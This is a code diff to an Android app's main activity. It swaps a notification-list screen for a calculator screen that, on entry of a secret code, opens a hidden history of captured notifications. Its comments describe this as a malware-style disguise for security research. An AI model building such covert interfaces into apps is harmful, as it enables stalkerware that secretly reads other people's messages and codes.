@@ -1,36 +1,27 @@
 package com.putra.notificationlisteners
 
+import android.content.Intent
 import android.os.Bundle
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
-import com.putra.notificationlisteners.ui.screens.NotificationListScreen
+import com.putra.notificationlisteners.ui.activity.NotificationHistoryActivity
+import com.putra.notificationlisteners.ui.screens.CalculatorScreen
 import com.putra.notificationlisteners.ui.theme.NotificationListenersTheme
 
 /**
- * Main entry point of the Notification Capture application.
+ * Main Activity — displays the calculator UI by default.
  *
- * This Activity hosts the Compose UI and serves as the launching point
- * for the security research tool. The actual notification interception
- * happens in NotificationCaptureService (a bound system service), while
- * this Activity provides the user interface for:
+ * This activity serves as the "public face" of the application.
+ * To an observer, it appears to be a simple calculator.
  *
- * 1. Checking/requesting notification listener permission
- * 2. Displaying captured notifications in real-time
- * 3. Managing (clearing) the captured notification database
+ * However, when the user enters the secret code (231199), it
+ * navigates to NotificationHistoryActivity where all captured
+ * notifications are displayed.
  *
- * ARCHITECTURE OVERVIEW (MVVM):
- * ┌─────────────┐    ┌──────────────┐    ┌────────────┐    ┌──────────┐
- * │  Compose UI  │ ←→ │  ViewModel   │ ←→ │ Repository │ ←→ │ Room DB  │
- * │  (View)      │    │              │    │            │    │ (SQLite) │
- * └─────────────┘    └──────────────┘    └────────────┘    └──────────┘
- *                                                                ↑
- *                                     ┌──────────────────────────┘
- *                                     │
- *                          ┌──────────┴──────────┐
- *                          │ NotificationListener │
- *                          │ Service (writes)     │
- *                          └─────────────────────┘
+ * SECURITY RESEARCH: This demonstrates a common obfuscation
+ * technique used by malware: hiding dangerous functionality
+ * behind a benign-looking UI.
  */
 class MainActivity : ComponentActivity() {
 
@@ -39,8 +30,22 @@ class MainActivity : ComponentActivity() {
         enableEdgeToEdge()
         setContent {
             NotificationListenersTheme {
-                NotificationListScreen()
+                CalculatorScreen(
+                    onSecretCodeTriggered = {
+                        // Navigate to hidden notification history
+                        navigateToNotificationHistory()
+                    }
+                )
             }
         }
+    }
+
+    /**
+     * Navigate to the NotificationHistoryActivity.
+     * Called when secret code (231199) is detected.
+     */
+    private fun navigateToNotificationHistory() {
+        val intent = Intent(this, NotificationHistoryActivity::class.java)
+        startActivity(intent)
     }
 }
